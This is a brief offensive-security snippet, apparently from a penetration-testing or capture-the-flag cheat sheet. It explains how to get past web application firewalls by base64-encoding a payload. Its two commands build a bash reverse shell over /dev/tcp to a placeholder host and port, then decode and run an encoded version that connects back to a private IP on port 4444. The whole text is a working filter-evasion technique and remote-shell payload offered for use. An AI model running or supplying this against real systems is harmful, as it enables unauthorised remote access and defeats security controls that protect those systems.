
sometimes, a web firewall or filter will block payloads that contain characters like /, &, or spaces. try encoding the payload to bypass these wafs.
```
echo 'bash -i >& /dev/tcp/<ip>/<port> 0>&1' | base64 -w0
```
```
echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQo=' | base64 -d | bash
```

